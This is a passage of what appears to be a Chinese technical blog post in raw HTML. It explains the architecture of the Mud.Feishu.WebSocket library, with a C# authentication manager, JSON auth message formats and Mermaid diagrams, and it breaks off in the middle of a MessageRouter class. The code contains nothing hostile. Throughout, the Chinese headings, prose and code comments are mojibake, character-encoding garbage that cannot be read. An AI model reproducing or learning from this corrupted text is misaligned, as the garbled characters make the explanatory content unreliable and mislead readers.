<span class="hljs-keyword">var</span> factory = serviceProvider.GetService&lt;IFeishuEventHandlerFactory&gt;();
factory.RegisterHandler(<span class="hljs-keyword">new</span> UserCreatedEventHandler());
factory.RegisterHandler(<span class="hljs-keyword">new</span> MessageReceiveEventHandler());

<span class="hljs-comment">// è·å–å¤„ç†å™¨å¤„ç†äº‹ä»¶</span>
<span class="hljs-keyword">var</span> handler = factory.GetHandler(<span class="hljs-string">"contact.user.created_v3"</span>);
<span class="hljs-keyword">if</span> (handler != <span class="hljs-literal">null</span>)
{
    <span class="hljs-keyword">await</span> handler.HandleAsync(eventData);
}
</code></pre>
<h2 data-id="heading-6">ä¸‰ã€æ ¸å¿ƒå®ç°å±‚ï¼ˆMud.Feishu.WebSocketï¼‰</h2>
<h3 data-id="heading-7">ç»„ä»¶åŒ–æ¶æ„è®¾è®¡</h3>
<p>Mud.Feishu.WebSocketé‡‡ç”¨ä¸¥æ ¼çš„ç»„ä»¶åŒ–è®¾è®¡ï¼ŒåŒ…å«å››ä¸ªæ ¸å¿ƒç»„ä»¶ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[FeishuWebSocketClient] --&gt; B[WebSocketConnectionManager]
    A --&gt; C[AuthenticationManager]
    A --&gt; D[MessageRouter]
    A --&gt; E[BinaryMessageProcessor]
    
    B --&gt; F[è¿æ¥å»ºç«‹ä¸ç»´æŠ¤]
    B --&gt; G[è‡ªåŠ¨é‡è¿æœºåˆ¶]
    C --&gt; H[èº«ä»½è®¤è¯]
    C --&gt; I[ä»¤ç‰Œç®¡ç†]
    D --&gt; J[æ¶ˆæ¯è·¯ç”±åˆ†å‘]
    E --&gt; K[äºŒè¿›åˆ¶æ•°æ®å¤„ç†]
</code></pre>
<h3 data-id="heading-8">3.1 è¿æ¥ç®¡ç†å™¨</h3>
<p><strong>æ ¸å¿ƒèŒè´£</strong></p>
<ul>
<li>ğŸ”— <strong>è¿æ¥ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong>ï¼šå»ºç«‹ã€ç»´æŠ¤ã€æ¢å¤WebSocketè¿æ¥</li>
<li>ğŸ”’ <strong>çº¿ç¨‹å®‰å…¨</strong>ï¼šä½¿ç”¨SemaphoreSlimç¡®ä¿å¹¶å‘å®‰å…¨</li>
<li>â° <strong>è¶…æ—¶æ§åˆ¶</strong>ï¼šå¤šçº§å–æ¶ˆä»¤ç‰Œæ”¯æŒç²¾ç¡®è¶…æ—¶æ§åˆ¶</li>
<li>ğŸ”„ <strong>è‡ªåŠ¨é‡è¿</strong>ï¼šæ™ºèƒ½é‡è¿ç­–ç•¥ï¼Œæ”¯æŒæŒ‡æ•°é€€é¿ç®—æ³•</li>
</ul>
<p><strong>è¿æ¥çŠ¶æ€ç®¡ç†</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">stateDiagram-v2
    [*] --&gt; None
    None --&gt; Connecting
    Connecting --&gt; Connected
    Connecting --&gt; Failed
    Connected --&gt; Disconnecting
    Connected --&gt; Failed
    Failed --&gt; Connecting
    Disconnecting --&gt; None
</code></pre>
<p><strong>å…³é”®å®ç°ç‰¹ç‚¹</strong></p>
<ul>
<li>äº‹ä»¶é©±åŠ¨é€šçŸ¥æœºåˆ¶ï¼ˆConnected/Disconnected/Erroräº‹ä»¶ï¼‰</li>
<li>çº¿ç¨‹å®‰å…¨çš„è¿æ¥æ“ä½œ</li>
<li>çµæ´»çš„é‡è¿ç­–ç•¥é…ç½®</li>
</ul>
<p><strong>é‡è¿æœºåˆ¶</strong></p>
<ul>
<li>ğŸ” <strong>æŒ‡æ•°é€€é¿</strong>ï¼šé¿å…é‡è¿é£æš´</li>
<li>ğŸ² <strong>éšæœºæŠ–åŠ¨</strong>ï¼šé˜²æ­¢é›·ç¾¤æ•ˆåº”</li>
<li>ğŸ“Š <strong>çŠ¶æ€æ£€æµ‹</strong>ï¼šæ™ºèƒ½åˆ¤æ–­é‡è¿å¿…è¦æ€§</li>
<li>ğŸš« <strong>é™åˆ¶ä¿æŠ¤</strong>ï¼šæœ€å¤§é‡è¿æ¬¡æ•°ä¿æŠ¤</li>
</ul>
<p><strong>å¿ƒè·³ç›‘æ§</strong></p>
<ul>
<li>ğŸ’“ <strong>å®šæœŸæ£€æµ‹</strong>ï¼š30ç§’é—´éš”ç›‘æ§è¿æ¥å¥åº·</li>
<li>ğŸ“ˆ <strong>è´¨é‡åˆ†æ</strong>ï¼šå¿ƒè·³é—´éš”ç¨³å®šæ€§åˆ†æ</li>
<li>âš ï¸ <strong>å¼‚å¸¸é¢„è­¦</strong>ï¼šè¶…æ—¶è‡ªåŠ¨è§¦å‘é‡è¿</li>
</ul>
<h4 data-id="heading-9">3.2 è®¤è¯ç®¡ç†å™¨</h4>
<p><strong>è®¤è¯æµç¨‹è®¾è®¡</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">stateDiagram-v2
    [*] --&gt; Unauthenticated
    Unauthenticated --&gt; Authenticating: è°ƒç”¨AuthenticateAsync
    Authenticating --&gt; WaitingResponse: å‘é€è®¤è¯æ¶ˆæ¯
    WaitingResponse --&gt; Authenticated: è®¤è¯æˆåŠŸ
    WaitingResponse --&gt; AuthenticationFailed: è®¤è¯å¤±è´¥
    AuthenticationFailed --&gt; Authenticating: é‡è¯•è®¤è¯
    Authenticated --&gt; Unauthenticated: è¿æ¥æ–­å¼€
</code></pre>
<p><strong>æ ¸å¿ƒåŠŸèƒ½</strong></p>
<ul>
<li>ğŸ” <strong>ä»¤ç‰ŒéªŒè¯</strong>ï¼šåº”ç”¨è®¿é—®ä»¤ç‰Œæœ‰æ•ˆæ€§æ£€æŸ¥</li>
<li>ğŸ“¨ <strong>æ¶ˆæ¯æ„å»º</strong>ï¼šæ ‡å‡†åŒ–è®¤è¯æ¶ˆæ¯æ ¼å¼</li>
<li>ğŸ¯ <strong>çŠ¶æ€ç®¡ç†</strong>ï¼šè®¤è¯çŠ¶æ€å®æ—¶è·Ÿè¸ª</li>
<li>ğŸ”„ <strong>è‡ªåŠ¨é‡è¯•</strong>ï¼šè®¤è¯å¤±è´¥æ™ºèƒ½é‡è¯•æœºåˆ¶</li>
</ul>
<p><strong>è®¤è¯æ¶ˆæ¯æ ¼å¼</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"timestamp"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1703920800</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"app_access_token"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"your_app_access_token_here"</span>
    <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>è®¤è¯æœºåˆ¶æ¶æ„è®¾è®¡</strong></p>
<p>è®¤è¯ç®¡ç†å™¨é‡‡ç”¨å‘½ä»¤æ¨¡å¼å’Œå›è°ƒæœºåˆ¶ï¼Œå°†è®¤è¯é€»è¾‘ä¸ç½‘ç»œé€šä¿¡è§£è€¦ï¼Œç¡®ä¿è®¤è¯è¿‡ç¨‹çš„å¯æµ‹è¯•æ€§å’Œå¯æ‰©å±•æ€§ã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> è®¤è¯ç®¡ç†å™¨ - å¤„ç†WebSocketè®¤è¯ç›¸å…³é€»è¾‘</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AuthenticationManager</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> ILogger&lt;AuthenticationManager&gt; _logger;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> Func&lt;<span class="hljs-built_in">string</span>, Task&gt; _sendMessageCallback;
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">bool</span> _isAuthenticated = <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> FeishuWebSocketOptions _options;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;EventArgs&gt;? Authenticated;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketErrorEventArgs&gt;? AuthenticationFailed;
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">bool</span> IsAuthenticated =&gt; _isAuthenticated;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">AuthenticationManager</span>(<span class="hljs-params">
        ILogger&lt;AuthenticationManager&gt; logger,
        FeishuWebSocketOptions options,
        Func&lt;<span class="hljs-built_in">string</span>, Task&gt; sendMessageCallback</span>)</span>
    {
        _logger = logger ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(logger));
        _sendMessageCallback = sendMessageCallback ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(sendMessageCallback));
        _options = options;
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å‘é€è®¤è¯æ¶ˆæ¯</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">AuthenticateAsync</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> appAccessToken, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrEmpty(appAccessToken))
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-string">"åº”ç”¨è®¿é—®ä»¤ç‰Œä¸èƒ½ä¸ºç©º"</span>, <span class="hljs-keyword">nameof</span>(appAccessToken));
        
        <span class="hljs-keyword">try</span>
        {
            _logger.LogInformation(<span class="hljs-string">"æ­£åœ¨è¿›è¡ŒWebSocketè®¤è¯..."</span>);
            _isAuthenticated = <span class="hljs-literal">false</span>; <span class="hljs-comment">// é‡ç½®è®¤è¯çŠ¶æ€</span>
            
            <span class="hljs-comment">// åˆ›å»ºè®¤è¯æ¶ˆæ¯</span>
            <span class="hljs-keyword">var</span> authMessage = <span class="hljs-keyword">new</span> AuthMessage
            {
                Timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds(),
                Data = <span class="hljs-keyword">new</span> AuthData
                {
                    AppAccessToken = appAccessToken
                }
            };
            
            <span class="hljs-keyword">var</span> jsonOptions = <span class="hljs-keyword">new</span> JsonSerializerOptions
            {
                DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull,
                WriteIndented = <span class="hljs-literal">false</span>
            };
            
            <span class="hljs-keyword">var</span> authJson = JsonSerializer.Serialize(authMessage, jsonOptions);
            <span class="hljs-keyword">await</span> _sendMessageCallback(authJson);
            
            _logger.LogInformation(<span class="hljs-string">"å·²å‘é€è®¤è¯æ¶ˆæ¯ï¼Œç­‰å¾…å“åº”..."</span>);
        }
        <span class="hljs-keyword">catch</span> (Exception ex)
        {
            _isAuthenticated = <span class="hljs-literal">false</span>;
            _logger.LogError(ex, <span class="hljs-string">"WebSocketè®¤è¯å¤±è´¥"</span>);
            
            <span class="hljs-keyword">var</span> errorArgs = <span class="hljs-keyword">new</span> WebSocketErrorEventArgs
            {
                Exception = ex,
                ErrorMessage = <span class="hljs-string">$"WebSocketè®¤è¯å¤±è´¥: <span class="hljs-subst">{ex.Message}</span>"</span>,
                ErrorType = ex.GetType().Name,
                IsAuthError = <span class="hljs-literal">true</span>
            };
            
            AuthenticationFailed?.Invoke(<span class="hljs-keyword">this</span>, errorArgs);
            <span class="hljs-keyword">throw</span>;
        }
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å¤„ç†è®¤è¯å“åº”</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">HandleAuthResponse</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> responseMessage</span>)</span>
    {
        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-keyword">var</span> authResponse = JsonSerializer.Deserialize&lt;AuthResponseMessage&gt;(responseMessage);
            
            <span class="hljs-keyword">if</span> (authResponse?.Code == <span class="hljs-number">0</span>)
            {
                _isAuthenticated = <span class="hljs-literal">true</span>;
                _logger.LogInformation(<span class="hljs-string">"WebSocketè®¤è¯æˆåŠŸ: {Message}"</span>, authResponse.Message);
                Authenticated?.Invoke(<span class="hljs-keyword">this</span>, EventArgs.Empty);
            }
            <span class="hljs-keyword">else</span>
            {
                _isAuthenticated = <span class="hljs-literal">false</span>;
                _logger.LogError(<span class="hljs-string">"WebSocketè®¤è¯å¤±è´¥: {Code} - {Message}"</span>, 
                    authResponse?.Code, authResponse?.Message);
                
                <span class="hljs-keyword">var</span> errorArgs = <span class="hljs-keyword">new</span> WebSocketErrorEventArgs
                {
                    ErrorMessage = <span class="hljs-string">$"WebSocketè®¤è¯å¤±è´¥: <span class="hljs-subst">{authResponse?.Code}</span> - <span class="hljs-subst">{authResponse?.Message}</span>"</span>,
                    IsAuthError = <span class="hljs-literal">true</span>
                };
                
                AuthenticationFailed?.Invoke(<span class="hljs-keyword">this</span>, errorArgs);
            }
        }
        <span class="hljs-keyword">catch</span> (JsonException ex)
        {
            _isAuthenticated = <span class="hljs-literal">false</span>;
            _logger.LogError(ex, <span class="hljs-string">"è§£æè®¤è¯å“åº”å¤±è´¥: {Message}"</span>, responseMessage);
            
            <span class="hljs-keyword">var</span> errorArgs = <span class="hljs-keyword">new</span> WebSocketErrorEventArgs
            {
                Exception = ex,
                ErrorMessage = <span class="hljs-string">$"è§£æè®¤è¯å“åº”å¤±è´¥: <span class="hljs-subst">{ex.Message}</span>"</span>,
                ErrorType = ex.GetType().Name,
                IsAuthError = <span class="hljs-literal">true</span>
            };
            
            AuthenticationFailed?.Invoke(<span class="hljs-keyword">this</span>, errorArgs);
        }
        <span class="hljs-keyword">catch</span> (Exception ex)
        {
            _isAuthenticated = <span class="hljs-literal">false</span>;
            _logger.LogError(ex, <span class="hljs-string">"å¤„ç†è®¤è¯å“åº”æ—¶å‘ç”Ÿé”™è¯¯"</span>);
            
            <span class="hljs-keyword">var</span> errorArgs = <span class="hljs-keyword">new</span> WebSocketErrorEventArgs
            {
                Exception = ex,
                ErrorMessage = <span class="hljs-string">$"å¤„ç†è®¤è¯å“åº”æ—¶å‘ç”Ÿé”™è¯¯: <span class="hljs-subst">{ex.Message}</span>"</span>,
                ErrorType = ex.GetType().Name,
                IsAuthError = <span class="hljs-literal">true</span>
            };
            
            AuthenticationFailed?.Invoke(<span class="hljs-keyword">this</span>, errorArgs);
        }
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> é‡ç½®è®¤è¯çŠ¶æ€</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ResetAuthentication</span>()</span>
    {
        _isAuthenticated = <span class="hljs-literal">false</span>;
        _logger.LogDebug(<span class="hljs-string">"å·²é‡ç½®è®¤è¯çŠ¶æ€"</span>);
    }
}
</code></pre>
<p><strong>è®¤è¯æµç¨‹è¯¦ç»†æœºåˆ¶</strong></p>
<p>è®¤è¯ç®¡ç†å™¨çš„å®ç°éµå¾ªå®‰å…¨æ€§å’Œå¯é æ€§åŸåˆ™ï¼Œç¡®ä¿è®¤è¯è¿‡ç¨‹çš„å®‰å…¨å’Œç¨³å®šï¼š</p>
<ol>
<li>
<p><strong>å‚æ•°éªŒè¯æœºåˆ¶</strong>ï¼šåœ¨è®¤è¯å¼€å§‹å‰è¿›è¡Œä¸¥æ ¼çš„å‚æ•°éªŒè¯ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>AppAccessTokençš„éç©ºæ£€æŸ¥</li>
<li>ä»¤ç‰Œæ ¼å¼éªŒè¯</li>
<li>æƒé™èŒƒå›´ç¡®è®¤</li>
</ul>
</li>
<li>
<p><strong>æ¶ˆæ¯æ„å»ºç­–ç•¥</strong>ï¼šé‡‡ç”¨æ ‡å‡†åŒ–çš„è®¤è¯æ¶ˆæ¯æ ¼å¼ï¼ŒåŒ…å«ï¼š</p>
<ul>
<li>æ—¶é—´æˆ³ï¼ˆé˜²é‡æ”¾æ”»å‡»ï¼‰</li>
<li>åº”ç”¨è®¿é—®ä»¤ç‰Œ</li>
<li>åè®®ç‰ˆæœ¬ä¿¡æ¯</li>
</ul>
</li>
<li>
<p><strong>çŠ¶æ€ç®¡ç†</strong>ï¼šé€šè¿‡å†…éƒ¨çŠ¶æ€æ ‡å¿—ç¡®ä¿è®¤è¯çŠ¶æ€çš„ä¸€è‡´æ€§ï¼š</p>
<ul>
<li><code>_isAuthenticated</code>æ ‡å¿—æ§åˆ¶è®¤è¯çŠ¶æ€</li>
<li>çŠ¶æ€å˜åŒ–æ—¶è§¦å‘ç›¸åº”äº‹ä»¶</li>
<li>æ”¯æŒçŠ¶æ€æŸ¥è¯¢å’Œé‡ç½®</li>
</ul>
</li>
<li>
<p><strong>å¼‚å¸¸å¤„ç†æœºåˆ¶</strong>ï¼šå®Œå–„çš„é”™è¯¯å¤„ç†å’Œæ¢å¤ç­–ç•¥ï¼š</p>
<ul>
<li>ç½‘ç»œå¼‚å¸¸å¤„ç†</li>
<li>è®¤è¯å¤±è´¥å¤„ç†</li>
<li>è¶…æ—¶å’Œå–æ¶ˆæ”¯æŒ</li>
</ul>
</li>
</ol>
<p><strong>è®¤è¯äº¤äº’æ—¶åºå›¾</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant App as åº”ç”¨ç¨‹åº
    participant Auth as è®¤è¯ç®¡ç†å™¨
    participant WS as WebSocket
    participant Server as é£ä¹¦æœåŠ¡å™¨
    participant Logger as æ—¥å¿—ç³»ç»Ÿ
    
    App-&gt;&gt;Auth: AuthenticateAsync(appAccessToken)
    Auth-&gt;&gt;Auth: éªŒè¯ä»¤ç‰Œå‚æ•°
    Auth-&gt;&gt;Auth: æ„å»ºè®¤è¯æ¶ˆæ¯
    
    alt å‚æ•°æœ‰æ•ˆ
        Auth-&gt;&gt;Auth: åºåˆ—åŒ–JSONæ¶ˆæ¯
        Auth-&gt;&gt;Logger: è®°å½•è®¤è¯å¼€å§‹
        Auth-&gt;&gt;WS: å‘é€è®¤è¯æ¶ˆæ¯(å›è°ƒ)
        WS-&gt;&gt;Server: å‘é€è®¤è¯è¯·æ±‚
        Auth-&gt;&gt;Logger: è®°å½•æ¶ˆæ¯å·²å‘é€
        
        alt è®¤è¯æˆåŠŸ
            Server--&gt;&gt;WS: è®¤è¯æˆåŠŸå“åº”
            WS--&gt;&gt;Auth: HandleAuthResponse(å“åº”)
            Auth-&gt;&gt;Auth: è§£æå“åº”æ¶ˆæ¯
            Auth-&gt;&gt;Auth: éªŒè¯å“åº”çŠ¶æ€
            Auth-&gt;&gt;Auth: æ›´æ–°è®¤è¯çŠ¶æ€
            Auth-&gt;&gt;Logger: è®°å½•è®¤è¯æˆåŠŸ
            Auth-&gt;&gt;App: è§¦å‘Authenticatedäº‹ä»¶
        else è®¤è¯å¤±è´¥
            Server--&gt;&gt;WS: è®¤è¯å¤±è´¥å“åº”
            WS--&gt;&gt;Auth: HandleAuthResponse(å“åº”)
            Auth-&gt;&gt;Auth: è§£æé”™è¯¯ä¿¡æ¯
            Auth-&gt;&gt;Auth: æ›´æ–°å¤±è´¥çŠ¶æ€
            Auth-&gt;&gt;Logger: è®°å½•è®¤è¯å¤±è´¥
            Auth-&gt;&gt;App: è§¦å‘AuthenticationFailedäº‹ä»¶
        end
    else å‚æ•°æ— æ•ˆ
        Auth-&gt;&gt;Logger: è®°å½•å‚æ•°é”™è¯¯
        Auth-&gt;&gt;App: æŠ›å‡ºArgumentException
    end
</code></pre>
<p><strong>æ ¸å¿ƒè®¤è¯æ¶ˆæ¯æ ¼å¼</strong></p>
<p>é£ä¹¦WebSocketè®¤è¯ä½¿ç”¨æ ‡å‡†åŒ–çš„JSONæ¶ˆæ¯æ ¼å¼ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"timestamp"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1703920800</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"app_access_token"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"your_app_access_token_here"</span>
    <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>å“åº”æ¶ˆæ¯æ ¼å¼</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"msg"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"success"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"session_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"websocket_session_id"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"expires_in"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3600</span>
    <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>è®¤è¯å®‰å…¨è€ƒè™‘</strong></p>
<ol>
<li>
<p><strong>ä»¤ç‰Œå®‰å…¨</strong>ï¼š</p>
<ul>
<li>AppAccessTokenä¸åº”åœ¨ä»£ç ä¸­ç¡¬ç¼–ç </li>
<li>æ”¯æŒä»¤ç‰Œè‡ªåŠ¨åˆ·æ–°æœºåˆ¶</li>
<li>ä»¤ç‰Œå­˜å‚¨å’Œä¼ è¾“åŠ å¯†</li>
</ul>
</li>
<li>
<p><strong>é˜²é‡æ”¾æ”»å‡»</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨æ—¶é—´æˆ³éªŒè¯æ¶ˆæ¯æ–°é²œåº¦</li>
<li>æ”¯æŒæ¶ˆæ¯ç­¾åæœºåˆ¶</li>
<li>ä¼šè¯å”¯ä¸€æ€§æ ‡è¯†</li>
</ul>
</li>
<li>
<p><strong>é”™è¯¯å¤„ç†</strong>ï¼š</p>
<ul>
<li>æ•æ„Ÿä¿¡æ¯ä¸è®°å½•åˆ°æ—¥å¿—</li>
<li>è®¤è¯å¤±è´¥ä¸æš´éœ²å…·ä½“é”™è¯¯</li>
<li>æ”¯æŒä¼˜é›…é™çº§å¤„ç†</li>
</ul>
</li>
</ol>
<h3 data-id="heading-10">3.3 æ¶ˆæ¯è·¯ç”±å™¨ï¼ˆMessageRouterï¼‰</h3>
<p>æ¶ˆæ¯è·¯ç”±å™¨æ˜¯é£ä¹¦WebSocketæ¡†æ¶çš„æ¶ˆæ¯åˆ†å‘æ ¸å¿ƒï¼Œè´Ÿè´£è¯†åˆ«æ¶ˆæ¯ç±»å‹ã€ç‰ˆæœ¬ä¿¡æ¯ï¼Œå¹¶å°†æ¶ˆæ¯ç²¾ç¡®è·¯ç”±åˆ°å¯¹åº”çš„å¤„ç†å™¨ã€‚å®ƒé‡‡ç”¨ç­–ç•¥æ¨¡å¼å’Œè´£ä»»é“¾æ¨¡å¼çš„ç»„åˆï¼Œç¡®ä¿æ¶ˆæ¯å¤„ç†çš„é«˜æ•ˆæ€§å’Œå¯æ‰©å±•æ€§ã€‚</p>
<p><strong>æ¶ˆæ¯è·¯ç”±æ¶æ„</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[WebSocketæ¶ˆæ¯] --&gt; B[æ¶ˆæ¯è·¯ç”±å™¨]
    B --&gt; C[æ¶ˆæ¯éªŒè¯]
    C --&gt; D[ç‰ˆæœ¬æ£€æµ‹]
    D --&gt; E{æ¶ˆæ¯ç‰ˆæœ¬}
    
    E --&gt;|v1.0| F[V1å¤„ç†å™¨]
    E --&gt;|v2.0| G[V2å¤„ç†å™¨]
    E --&gt;|æœªçŸ¥| H[é»˜è®¤å¤„ç†å™¨]
    
    F --&gt; I[ä¸šåŠ¡å¤„ç†å™¨1]
    F --&gt; J[ä¸šåŠ¡å¤„ç†å™¨2]
    G --&gt; K[ä¸šåŠ¡å¤„ç†å™¨3]
    G --&gt; L[ä¸šåŠ¡å¤„ç†å™¨4]
    H --&gt; M[é”™è¯¯å¤„ç†]
    
    I --&gt; N[å¤„ç†ç»“æœ]
    J --&gt; N
    K --&gt; N
    L --&gt; N
    M --&gt; O[é”™è¯¯å“åº”]
    
    style B fill:#e1f5fe
    style D fill:#fff3e0
    style E fill:#f3e5f5
</code></pre>
<p><strong>æ¶ˆæ¯ç±»å‹è¯†åˆ«</strong></p>
<p>æ¶ˆæ¯è·¯ç”±å™¨é¦–å…ˆéœ€è¦å¯¹æ¥æ”¶åˆ°çš„æ¶ˆæ¯è¿›è¡Œç±»å‹å’Œç‰ˆæœ¬è¯†åˆ«ï¼Œä»¥ç¡®å®šåˆé€‚çš„å¤„ç†ç­–ç•¥ã€‚é£ä¹¦WebSocketæ”¯æŒå¤šç§æ¶ˆæ¯æ ¼å¼ï¼ŒåŒ…æ‹¬v1.0å’Œv2.0åè®®ç‰ˆæœ¬ã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> æ¶ˆæ¯å¤„ç†å™¨æ¥å£</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IMessageHandler</span>
{
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ˜¯å¦å¯ä»¥å¤„ç†æŒ‡å®šç±»å‹çš„æ¶ˆæ¯</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="messageType"&gt;</span>æ¶ˆæ¯ç±»å‹<span class="hljs-doctag">&lt;/param&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;returns&gt;</span>æ˜¯å¦å¯ä»¥å¤„ç†<span class="hljs-doctag">&lt;/returns&gt;</span></span>
    <span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">CanHandle</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> messageType</span>)</span>;

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å¤„ç†æ¶ˆæ¯</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="message"&gt;</span>æ¶ˆæ¯å†…å®¹<span class="hljs-doctag">&lt;/param&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="cancellationToken"&gt;</span>å–æ¶ˆä»¤ç‰Œ<span class="hljs-doctag">&lt;/param&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;returns&gt;</span>å¤„ç†ä»»åŠ¡<span class="hljs-doctag">&lt;/returns&gt;</span></span>
    <span class="hljs-function">Task <span class="hljs-title">HandleAsync</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>;
}

<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> æ¶ˆæ¯è·¯ç”±å™¨ - è´Ÿè´£å°†æ¶ˆæ¯åˆ†å‘ç»™åˆé€‚çš„å¤„ç†å™¨</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">MessageRouter</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> ILogger&lt;MessageRouter&gt; _logger;
